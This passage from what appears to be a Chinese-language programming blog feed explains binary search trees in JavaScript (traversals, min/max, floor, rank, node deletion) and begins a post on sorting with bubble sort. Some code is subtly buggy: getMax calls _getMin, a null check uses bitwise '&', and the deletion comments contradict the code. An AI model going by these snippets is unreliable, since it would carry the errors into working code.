class="keyword">this</span>.root = <span class="keyword">this</span>._addChild(<span class="keyword">this</span>.root, v)</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 添加节点时，需要比较添加的节点值和当前</span></div><div class="line">  <span class="comment">// 节点值的大小</span></div><div class="line">  _addChild(node, v) &#123;</div><div class="line">    <span class="keyword">if</span> (!node) &#123;</div><div class="line">      <span class="keyword">this</span>.size++</div><div class="line">      <span class="keyword">return</span> new Node(v)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (node.value &gt; v) &#123;</div><div class="line">      node.left = <span class="keyword">this</span>._addChild(node.left, v)</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.value &lt; v) &#123;</div><div class="line">      node.right = <span class="keyword">this</span>._addChild(node.right, v)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> node</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><blockquote><p>二、树的遍历</p></blockquote><p>1、深度遍历</p><p>对于树的遍历来说，有三种遍历方法，分别是先序遍历、中序遍历、后序遍历。三种遍历的区别在于何时访问节点。在遍历树的过程中，每个节点都会遍历三次，分别是遍历到自己，遍历左子树和遍历右子树。如果需要实现先序遍历，那么只需要第一次遍历到节点时进行操作即可。</p><p>以下都是递归实现：</p><p>1.1、先序遍历<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">// 先序遍历可用于打印树的结构</div><div class="line">// 先序遍历先访问根节点，然后访问左节点，最后访问右节点。</div><div class="line">preTraversal() &#123;</div><div class="line">  this._pre(this.root)</div><div class="line">&#125;</div><div class="line">_pre(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">    console.log(<span class="keyword">node</span>.<span class="title">value</span>)</div><div class="line">    this._pre(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">    this._pre(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>1.2、中序遍历<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">// 中序遍历可用于排序</div><div class="line">// 对于 BST 来说，中序遍历可以实现一次遍历就</div><div class="line">// 得到有序的值</div><div class="line">// 中序遍历表示先访问左节点，然后访问根节点，最后访问右节点。</div><div class="line">midTraversal() &#123;</div><div class="line">  this._mid(this.root)</div><div class="line">&#125;</div><div class="line">_mid(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">    this._mid(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">    console.log(<span class="keyword">node</span>.<span class="title">value</span>)</div><div class="line">    this._mid(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>1.3、后序遍历<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">// 后序遍历可用于先操作子节点</div><div class="line">// 再操作父节点的场景</div><div class="line">// 后序遍历表示先访问左节点，然后访问右节点，最后访问根节点。</div><div class="line">backTraversal() &#123;</div><div class="line">  this._back(this.root)</div><div class="line">&#125;</div><div class="line">_back(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">    this._back(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">    this._back(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">    console.log(<span class="keyword">node</span>.<span class="title">value</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>2、广度遍历<br>也就是一层层地遍历树。对于广度遍历来说，我们需要利用 队列结构 来完成。<br><figure class="highlight pony"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">breadthTraversal() &#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="literal">this</span>.root) <span class="keyword">return</span> null</div><div class="line">  <span class="keyword">let</span> q = <span class="function"><span class="keyword">new</span> <span class="title">Queue</span>()</span></div><div class="line">  <span class="comment">// 将根节点入队</span></div><div class="line">  <span class="title">q</span>.<span class="title">enQueue</span>(this.root)</div><div class="line">  <span class="comment">// 循环判断队列是否为空，为空</span></div><div class="line">  <span class="comment">// 代表树遍历完毕</span></div><div class="line">  <span class="title">while</span> (!q.isEmpty()) &#123;</div><div class="line">    <span class="comment">// 将队首出队，判断是否有左右子树</span></div><div class="line">    <span class="comment">// 有的话，就先左后右入队</span></div><div class="line">    <span class="title">let</span> <span class="title">n</span> = <span class="title">q</span>.<span class="title">deQueue</span>()</div><div class="line">    <span class="title">console</span>.<span class="title">log</span>(n.value)</div><div class="line">    <span class="title">if</span> (n.left) <span class="title">q</span>.<span class="title">enQueue</span>(n.left)</div><div class="line">    <span class="title">if</span> (n.right) <span class="title">q</span>.<span class="title">enQueue</span>(n.right)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>三、寻找最值</p></blockquote><p>第一步：因为二分查找树的特性，所以最小值一定在根节点的最左边，最大值相反<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">getMin() &#123;</div><div class="line">  return this._getMin(this.root).value</div><div class="line">&#125;</div><div class="line">_getMin(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (!<span class="keyword">node</span>.<span class="title">left</span>) return <span class="keyword">node</span></div><div class="line">  <span class="title">return</span> this._getMin(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">&#125;</div><div class="line">getMax() &#123;</div><div class="line">  return this._getMax(this.root).value</div><div class="line">&#125;</div><div class="line">_getMax(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  if (!<span class="keyword">node</span>.<span class="title">right</span>) return <span class="keyword">node</span></div><div class="line">  <span class="title">return</span> this._getMin(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>第二步：向上取整和向下取整，这两个操作是相反的，所以代码也是类似的，这里只介绍如何向下取整。</p><p>既然是向下取整，那么根据二分查找树的特性，值一定在根节点的左侧。只需要一直遍历左子树直到当前节点的值不再大于等于需要的值，然后判断节点是否还拥有右子树。如果有的话，继续上面的递归判断。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">floor(v) &#123;</div><div class="line">  let <span class="keyword">node</span> <span class="title">= this</span>._floor(this.root, v)</div><div class="line">  return <span class="keyword">node</span> <span class="title">? node</span>.value : null</div><div class="line">&#125;</div><div class="line">_floor(<span class="keyword">node</span><span class="title">, v</span>) &#123;</div><div class="line">  if (!<span class="keyword">node</span><span class="title">) return</span> null</div><div class="line">  if (<span class="keyword">node</span>.<span class="title">value</span> === v) return v</div><div class="line">  // 如果当前节点值还比需要的值大，就继续递归</div><div class="line">  if (<span class="keyword">node</span>.<span class="title">value</span> &gt; v) &#123;</div><div class="line">    return this._floor(<span class="keyword">node</span>.<span class="title">left</span>, v)</div><div class="line">  &#125;</div><div class="line">  // 判断当前节点是否拥有右子树</div><div class="line">  let right = this._floor(<span class="keyword">node</span>.<span class="title">right</span>, v)</div><div class="line">  if (right) return right</div><div class="line">  return <span class="keyword">node</span></div><div class="line"><span class="title">&#125;</span></div></pre></td></tr></table></figure></p><p>第三步：<strong>排 名</strong><br>这是用于获取给定值的排名或者排名第几的节点的值，这两个操作也是相反的，所以这个只介绍如何获取排名第几的节点的值。对于这个操作而言，我们需要略微的改造点代码，让每个节点拥有一个 <code>size</code> 属性。该属性表示该节点下有多少子节点（包含自身）<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(value) &#123;</div><div class="line">    <span class="keyword">this</span>.value = value</div><div class="line">    <span class="keyword">this</span>.left = <span class="literal">null</span></div><div class="line">    <span class="keyword">this</span>.right = <span class="literal">null</span></div><div class="line">    <span class="comment">// 修改代码</span></div><div class="line">    <span class="keyword">this</span>.size = <span class="number">1</span></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 新增代码</span></div><div class="line">_getSize(node) &#123;</div><div class="line">  <span class="keyword">return</span> node ? node.size : <span class="number">0</span></div><div class="line">&#125;</div><div class="line">_addChild(node, v) &#123;</div><div class="line">  <span class="keyword">if</span> (!node) &#123;</div><div class="line">    <span class="keyword">return</span> new Node(v)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> (node.value &gt; v) &#123;</div><div class="line">    <span class="comment">// 修改代码</span></div><div class="line">    node.size++</div><div class="line">    node.left = <span class="keyword">this</span>._addChild(node.left, v)</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node.value &lt; v) &#123;</div><div class="line">    <span class="comment">// 修改代码</span></div><div class="line">    node.size++</div><div class="line">    node.right = <span class="keyword">this</span>._addChild(node.right, v)</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> node</div><div class="line">&#125;</div><div class="line">select(k) &#123;</div><div class="line">  let node = <span class="keyword">this</span>._select(<span class="keyword">this</span>.root, k)</div><div class="line">  <span class="keyword">return</span> node ? node.value : <span class="literal">null</span></div><div class="line">&#125;</div><div class="line">_select(node, k) &#123;</div><div class="line">  <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="literal">null</span></div><div class="line">  <span class="comment">// 先获取左子树下有几个节点</span></div><div class="line">  let size = node.left ? node.left.size : <span class="number">0</span></div><div class="line">  <span class="comment">// 判断 size 是否大于 k</span></div><div class="line">  <span class="comment">// 如果大于 k，代表所需要的节点在左节点</span></div><div class="line">  <span class="keyword">if</span> (size &gt; k) <span class="keyword">return</span> <span class="keyword">this</span>._select(node.left, k)</div><div class="line">  <span class="comment">// 如果小于 k，代表所需要的节点在右节点</span></div><div class="line">  <span class="comment">// 注意这里需要重新计算 k，减去根节点除了右子树的节点数量</span></div><div class="line">  <span class="keyword">if</span> (size &lt; k) <span class="keyword">return</span> <span class="keyword">this</span>._select(node.right, k - size - <span class="number">1</span>)</div><div class="line">  <span class="keyword">return</span> node</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>四、删除(最小)节点</p></blockquote><p>对于删除节点来说，会存在以下几种情况</p><ul><li>需要删除的节点没有子树</li><li>需要删除的节点只有一条子树</li><li>需要删除的节点有左右两条树</li></ul><p>对于前两种情况很好解决，但是第三种情况就有难度了，所以先来实现相对简单的操作：<strong>删除最小节点</strong>，对于删除最小节点来说，是不存在第三种情况的，删除最大节点操作是和删除最小节点相反的，所以这里也就不再赘述。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">delectMin() &#123;</div><div class="line">  this.root = this._delectMin(this.root)</div><div class="line">  console.log(this.root)</div><div class="line">&#125;</div><div class="line">_delectMin(<span class="keyword">node</span><span class="title">) &#123;</span></div><div class="line">  // 一直递归左子树</div><div class="line">  // 如果左子树为空，就判断节点是否拥有右子树</div><div class="line">  // 有右子树的话就把需要删除的节点替换为右子树</div><div class="line">  if ((<span class="keyword">node</span> <span class="title">!= null</span>) &amp; !<span class="keyword">node</span>.<span class="title">left</span>) return <span class="keyword">node</span>.<span class="title">right</span></div><div class="line">  <span class="keyword">node</span>.<span class="title">left</span> = this._delectMin(<span class="keyword">node</span>.<span class="title">left</span>)</div><div class="line">  // 最后需要重新维护下节点的 `size`</div><div class="line">  <span class="keyword">node</span>.<span class="title">size</span> = this._getSize(<span class="keyword">node</span>.<span class="title">left</span>) + this._getSize(<span class="keyword">node</span>.<span class="title">right</span>) + <span class="number">1</span></div><div class="line">  return <span class="keyword">node</span></div><div class="line"><span class="title">&#125;</span></div></pre></td></tr></table></figure></p><blockquote><p>五、删除(任意)节点</p></blockquote><p>当遇到这种情况时，需要取出当前节点的后继节点（也就是当前节点右子树的最小节点）来替换需要删除的节点。然后将需要删除节点的左子树赋值给后继结点，右子树删除后继结点后赋值给他。</p><p>你如果对于这个解决办法有疑问的话，可以这样考虑。因为二分查找树的特性，父节点一定比所有左子节点大，比所有右子节点小。那么当需要删除父节点时，势必需要拿出一个比父节点大的节点来替换父节点。这个节点肯定不存在于左子树，必然存在于右子树。然后又需要保持父节点都是比右子节点小的，那么就可以取出右子树中最小的那个节点来替换父节点。<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">delect(v) &#123;</div><div class="line">  this.root = this._delect(this.root, v)</div><div class="line">&#125;</div><div class="line">_delect(<span class="keyword">node</span><span class="title">, v</span>) &#123;</div><div class="line">  if (!<span class="keyword">node</span><span class="title">) return</span> null</div><div class="line">  // 寻找的节点比当前节点小，去左子树找</div><div class="line">  if (<span class="keyword">node</span>.<span class="title">value</span> <span class="tag">&lt; v) &#123;</span></div><div class="line">    node.right = this._delect(node.right, v)</div><div class="line">  &#125; else if (node.value &gt; v) &#123;</div><div class="line">    // 寻找的节点比当前节点大，去右子树找</div><div class="line">    <span class="keyword">node</span>.<span class="title">left</span> = this._delect(<span class="keyword">node</span>.<span class="title">left</span>, v)</div><div class="line">  &#125; else &#123;</div><div class="line">    // 进入这个条件说明已经找到节点</div><div class="line">    // 先判断节点是否拥有拥有左右子树中的一个</div><div class="line">    // 是的话，将子树返回出去，这里和 `_delectMin` 的操作一样</div><div class="line">    if (!<span class="keyword">node</span>.<span class="title">left</span>) return <span class="keyword">node</span>.<span class="title">right</span></div><div class="line">    if (!<span class="keyword">node</span>.<span class="title">right</span>) return <span class="keyword">node</span>.<span class="title">left</span></div><div class="line">    // 进入这里，代表节点拥有左右子树</div><div class="line">    // 先取出当前节点的后继结点，也就是取当前节点右子树的最小值</div><div class="line">    let min = this._getMin(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">    // 取出最小值后，删除最小值</div><div class="line">    // 然后把删除节点后的子树赋值给最小值节点</div><div class="line">    min.right = this._delectMin(<span class="keyword">node</span>.<span class="title">right</span>)</div><div class="line">    // 左子树不动</div><div class="line">    min.left = <span class="keyword">node</span>.<span class="title">left</span></div><div class="line">    <span class="keyword">node</span> <span class="title">= min</span></div><div class="line">  &#125;</div><div class="line">  // 维护 size</div><div class="line">  <span class="keyword">node</span>.<span class="title">size</span> = this._getSize(<span class="keyword">node</span>.<span class="title">left</span>) + this._getSize(<span class="keyword">node</span>.<span class="title">right</span>) + <span class="number">1</span></div><div class="line">  return <span class="keyword">node</span></div><div class="line"><span class="title">&#125;</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;树拥有很多种结构，二叉树是树中最常用的结构，同时也是一个天然的递归结构。&lt;/p&gt;
&lt;p&gt;二分查找树也是二叉树，拥有二叉树的特性。但是区别在于二分查找树每个节点的值都&lt;strong&gt;比他的左子树的值大&lt;/strong&gt;，&lt;strong&gt;比右子树的值小&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、创建一颗最简单的树&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight kotlin&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Node&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;constructor&lt;/span&gt;(value) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.value = value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.left = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.right = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;BST&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;constructor&lt;/span&gt;() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.root = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  getSize() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  isEmpty() &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size === &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  addNode(v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.root = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._addChild(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.root, v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 添加节点时，需要比较添加的节点值和当前&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;// 节点值的大小&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  _addChild(node, v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!node) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.size++&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; new Node(v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (node.value &amp;gt; v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      node.left = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._addChild(node.left, v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (node.value &amp;lt; v) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      node.right = &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._addChild(node.right, v)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; node&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>排序算法</title>
    <link href="wangsiyuan233.github.io/2018/07/19/62%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>wangsiyuan233.github.io/2018/07/19/62排序算法/</id>
    <published>2018-07-19T03:27:06.000Z</published>
    <updated>2018-07-25T23:25:48.691Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 准备</p></blockquote><p>1、时间复杂度：</p><p>通常使用最差的时间复杂度来衡量一个算法的好坏。</p><p>常数时间 O(1) 代表这个操作和数据量没关系，是一个固定时间的操作，比如说四则运算。</p><p>对于一个算法来说，可能会计算出如下操作次数 <code>aN + 1</code>，<code>N</code> 代表数据量。那么该算法的时间复杂度就是 <code>O(N)</code>。因为我们在计算时间复杂度的时候，数据量通常是非常大的，这时候低阶项和常数项可以忽略不计。</p><p>当然可能会出现两个算法都是 <code>O(N)</code> 的时间复杂度，那么对比两个算法的好坏就要通过对比低阶项和常数项了。</p><p>2、以下两个函数是本章节经常会用到的：<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> checkArray(<span class="built_in">array</span>)&#123;</div><div class="line">  <span class="keyword">if</span> (!<span class="built_in">array</span> || <span class="built_in">array</span>.length &lt;= <span class="number">2</span>) return</div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> swap(<span class="built_in">array</span>, <span class="built_in">left</span>, <span class="built_in">right</span>) &#123;</div><div class="line">  <span class="keyword">let</span> rightValue = <span class="built_in">array</span>[<span class="built_in">right</span>]</div><div class="line">  <span class="built_in">array</span>[<span class="built_in">right</span>] = <span class="built_in">array</span>[<span class="built_in">left</span>]</div><div class="line">  <span class="built_in">array</span>[<span class="built_in">left</span>] = rightValue</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><a id="more"></a><blockquote><p>一、冒泡排序</p></blockquote><p>冒泡排序是最简单的排序了，效率低下，从第一个开始，通过不断的和下一个数相比较，最后使得最小的数字在前面，最大的数字在后面。只用比较到 <code>length - 1</code></p><p>代码实现：<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">bubbleSort</span><span class="params">(array)</span></span>&#123;</div><div class="line">  checkArray(<span class="keyword">array</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i =  <span class="keyword">array</span>.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</div><div class="line">    <span class="comment">// 从 倒数第二个数 遍历到 0</span></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</div><div class="line">      <span class="comment">// 从 0 开始遍历到 i 的左边</span></div><div class="line">      <span class="keyword">if</span> (<span class="keyword">array</span>[j] &gt; <span class="keyword">array</span>[j+<span class="number">1</span>])&#123;</div><div class="line">        swap(<span class="keyword">array</span>, j, j+<span class="number">1</span>)</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">array</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><img 